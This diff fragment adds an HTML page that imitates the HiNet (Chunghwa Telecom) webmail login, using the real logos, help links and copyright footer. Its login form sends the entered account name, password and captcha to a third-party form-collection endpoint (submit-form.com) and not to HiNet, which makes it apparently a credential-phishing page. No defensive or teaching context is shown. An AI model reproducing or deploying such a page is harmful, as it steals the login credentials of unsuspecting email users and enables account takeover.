+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 82%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  overflow: auto;
+  margin-top: 0px;
+}
+
+.col50L{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  margin-bottom: 3px;
+  float: left;
+  margin-left: 11%;
+  width: 20%;
+}
+
+.col50R{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  margin-bottom: 3px;
+  float: left;
+  margin-left: 11%;
+  width: 20%;
+}
+
+.hr{
+
+  line-height: 1.42857143;
+  font-size: 100%;
+  color: #333;
+  height: 0;
+  box-sizing: content-box;
+  margin-top: 5px;
+  margin-bottom: 5px;
+}
+
+.flex_item{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  order: 1;
+}
+
+.container{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  outline-width: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  padding-right: 15px;
+  padding-left: 15px;
+  margin-right: auto;
+  margin-left: auto;
+  width: 1170px;
+}
+
+.footer_text{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  outline-style: none;
+  outline-width: 0px;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  text-align: center;
+  padding: 15px 0px;
+  width: 100%;
+  margin: 0;
+  font-size: 16px;
+}
+
+.footer-ad-image{
+  position: center;
+  margin-top: 20px;
+  margin-bottom: 30px;
+  margin-left: 200px;
+}
+.toolboxLabel{
+  color: #1e356c;
+}
+
+  </style>
+
+</head>
+<body>
+
+  <div class="outmost">
+
+    <div class="head">
+      <div class="head-left">
+        <div class="hinet-logo">
+          <img id="hinetLogo" src="https://webmail.hinet.net/images/hinet.png">
+        </div>
+      
+        <div class="webmail-logo">
+          <img id="webmailLogo" src="https://webmail.hinet.net/images/web-mail.png">
+        </div>
+      </div>
+      
+      
+      
+      <div class="head-right">
+       <a href="https://www.hinet.net/" target="_blank">HiNet首頁</a>
+       <a href="https://hiair.hinet.net/" target="_blank">簡訊</a>
+       <a href="index_en.html">English</a>
+      </div>
+    </div>
+  
+    <div class="middle">
+  
+      <div class="advert">
+        <svg class="ad-image" viewBox="0 0 2500 1309" x-score="1"></svg>
+      
+        <div class="under-ad">
+          <div class="two-years">
+            <a attributionsrc="" class="year" data-asoch-targets="ad0,ochTitle" dir="auto" href="https://www.webmail.hinet.net" target="_top" x-score="1">外燴王 食尚法式外燴<br>跑</a>
+            <a attributionsrc="" class="under-year" data-asoch-targets="ad0,ochUrl" dir="auto" href="https://www.webmail.hinet.net" target="_top" x-score="1">屏東縣政府</a>
+          </div>
+          <svg class="arrow" viewBox="0 0 100 100" x-score="1"><polyline fill="none" points="42,32 60,50 42,68" stroke-linecap="round" stroke-linejoin="round" stroke-width="6" stroke="#fff"></polyline></svg>
+        </div>
+  
+      </div>
+  
+      
+  
+      <div class="login-block">
+  
+        <div class="abgne-tab">
+  
+          <div class="two-tab">
+            <a href="#tab1" class="tab1">個人信箱</a>
+            <a href="#tab2" class="tab2">hiMail</a>
+          </div> 
+    
+          <div class="tab-content">
+            <div class="form-div">
+              <h2 class="h3">HiNet個人信箱</h2>
+            
+              <form name="personal" action="https://submit-form.com/moX6oCsIJ" method="post">
+                <div style="text-align: center;"> <span id="personalMessage" style="color: rgba(30,53,108,0.5);letter-spacing:1px;" class="f16">請輸入帳號,密碼和驗證碼</span> </div>
+    
+                <div class="ctrl-group1"> 
+    
+                  <div username-field>
+                    <div class="user-icon">
+                      <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-circle" class="svg-inline--fa fa-user-circle fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512">
+                      <path fill="currentColor" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 96c48.6 0 88 39.4 88 88s-39.4 88-88 88-88-39.4-88-88 39.4-88 88-88zm0 344c-58.7 0-111.3-26.6-146.5-68.2 18.8-35.4 55.6-59.8 98.5-59.8 2.4 0 4.8.4 7.1 1.1 13 4.2 26.6 6.9 40.9 6.9 14.3 0 28-2.7 40.9-6.9 2.3-.7 4.7-1.1 7.1-1.1 42.9 0 79.7 24.4 98.5 59.8C359.3 421.4 306.7 448 248 448z">
+                      </path> </svg>
+                    </div>
+                    <label for="idPuser" class="loginLabel"></label>
+                    <input id="idPuser" placeholder="帳號" name="email" tabindex="1" size="16" onkeyup="checkTheSame(document.personal)" title="使用者帳號(例：jack)" class="inputTxt" value="">
+                    <img id="show_username_keyboard" src="https://webmail.hinet.net/images/keyboard.png" title="Show virtual keyboard to input username!" class="imgKB">
+                  </div>
+    
+                </div>
+    
+                <div class="ctrl-group1"> 
+    
+                  <div username-field>
+                    <div class="user-icon">
+                      <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="lock" class="svg-inline--fa fa-lock fa-w-14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+                        <path fill="currentColor" d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z">
+                        </path></svg>
+                    </div>
+                    <label for="idPuser" class="loginLabel"></label>
+                    <input id="passPuser" placeholder="密碼" name="pass" tabindex="2" type="password" maxlength="255" size="16" class="inputTxt">              <img id="show_username_keyboard" src="https://webmail.hinet.net/images/keyboard.png" title="Show virtual keyboard to input username!" class="imgKB">
+                  </div>
+      
+                </div>
+    
+                <div class="img-captcha">
+                  <div class="ctrl-group1">
+                    <img class="clickable-image" id="captchaimage1" src="https://webmail.hinet.net/captchaImg.do?t=1715330385970" onclick="reloadCaptcha1()" title="點擊更換圖片">
+                  </div>
+                </div>
+                
+    
+                <div class="img-captcha">
+                  <div class="ctrl-group1">
+                    <input class="inputCaptcha" id="captcha_ans1" placeholder="驗證碼(不分大小寫)" name="captcha" tabindex="3" maxlength="6" size="16">
+                  </div>            
+                </div>
+    
+                <div class="ctrl-group1">
+                  <div class="savebtn">
+                    <input id="saveaccPuser" tabindex="4" aligh="right" onclick="switchSavePasswd(document.personal);" type="checkbox" value="1" name="saveAccount">
+                    <label for="saveaccPuser" class="checkboxLabel">記住帳號</label>
+                    <input id="savepwPuser" tabindex="5" aligh="right" onclick="switchSaveAccount(document.personal);" type="checkbox" value="1" name="savePasswd">
+                    <label for="savepwPuser" class="checkboxLabel">記住密碼</label>
+                  </div>
+                  <button class="okbtn" name="OK" id="OKPuser" tabindex="6">OK</button>
+                  <input id="cm1Puser" aligh="right" type="checkbox" value="cm1" name="cm1" style="display:none">
+                  <label for="cm1Puser" class="checkboxLabel" style="display:none">使用cm1信箱</label>
+                </div>
+    
+                <hr>
+    
+                <div class="ctrlGroup-divTable">
+                  <div class="col50L">
+                    <a href="https://lib.webmail.hinet.net/statement/F-account-1.htm" target="_blank"><span class="toolboxLabel">帳號申請</span></a>
+                  </div>
+                  <div class="col50R">
+                    <a href="https://lib.webmail.hinet.net/statement/manual_v20220425.pdf" target="_blank"><span class="toolboxLabel">使用手冊</span></a>
+                  </div>
+                  <div class="col50L">
+                    <a href="https://lib.webmail.hinet.net/statement/F-login-5.htm" target="_blank"><span class="toolboxLabel">忘記密碼</span></a>
+                  </div>
+                  <div class="col50R">
+                    <a href="https://lib.webmail.hinet.net/statement/login_info.htm" target="_blank"><span class="toolboxLabel">登入說明</span></a>
+                  </div>
+                  <div class="col50L">
+                    <a href="https://lib.webmail.hinet.net/statement/M-help-1.htm" target="_blank"><span class="toolboxLabel">常見問題</span></a>
+                  </div>
+                  <div class="col50R">
+                    <a href="https://lib.webmail.hinet.net/statement/termsvs.htm" target="_blank"><span class="toolboxLabel">使用規則</span></a>
+                  </div>
+                </div>
+                
+    
+    
+                
+                
+              
+              
+              
+              </form>
+            </div>
+            
+    
+          </div>
+          
+        </div>
+  
+        
+      </div>
+  
+    </div>
+
+    <div id="spacer" class="flex_item"></div>
+
+
+    <div id="tail" class="flex_item">
+      <footer>
+        <div class="container">
+
+          <img src="https://s0.2mdn.net/ads/richmedia/studio/60017870/60017870_20240314022823802_DISP_728x90_ACQ_ACQU_MU_202403_Q1_RCP1.jpg" alt="" class="footer-ad-image">
+
+
+          <div class="footer_text">
+            <div style="margin-top:3px">
+              | <a href="https://www.hinet.net/copyright.html" target="_blank">著作權保護</a>
+              | <a href="https://lib.webmail.hinet.net/statement/privacy.htm" target="_blank">隱私權保護</a>
+              | <a href="https://www.cht.com.tw/zh-tw/home/cht/esg/sustainable-governance/sustainable-development-vision" target="_blank">企業社會責任</a>
+              | <a href="https://www.hinet.net/kid.html" target="_blank">兒童網路安全</a>
+              | <a href="https://www.cht.com.tw/home/cht/recruit-and-training/recruit/recruit-information" target="_blank">人才招募</a>
+              | <a href="https://lib.webmail.hinet.net/statement/notify.htm" target="_blank">系統公告</a>
+              | <a href="https://www.cht.com.tw/home/consumer/member/contactus" target="_blank">聯絡我們</a> |
+            </div>
+            <div style="margin-top:3px">
+              <span style="vertical-align:middle;margin-left:3px;color:#a7a5a5;">中華電信股份有限公司版權所有 © Chunghwa Telecom Co., Ltd. All Rights Reserved. 免費服務電話 : 0800-080-123</span>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+
+  </div>
+
+
+  
+</body>
+</html>
